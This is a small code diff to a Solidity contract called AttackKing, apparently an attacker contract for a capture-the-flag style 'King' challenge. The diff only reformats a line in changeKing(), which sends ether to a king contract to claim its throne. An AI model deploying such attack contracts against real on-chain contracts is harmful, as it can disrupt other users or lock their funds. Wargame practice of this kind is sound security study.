@@ -34,7 +34,7 @@ contract AttackKing {
     function fund() public payable {}
 
     function changeKing() public {
-        (bool success, ) = address(king).call{value: 0.001 ether}("");
+        (bool success,) = address(king).call{value: 0.001 ether}("");
         require(success, "AttackKing:changeKing() transaction failed");
     }
 }
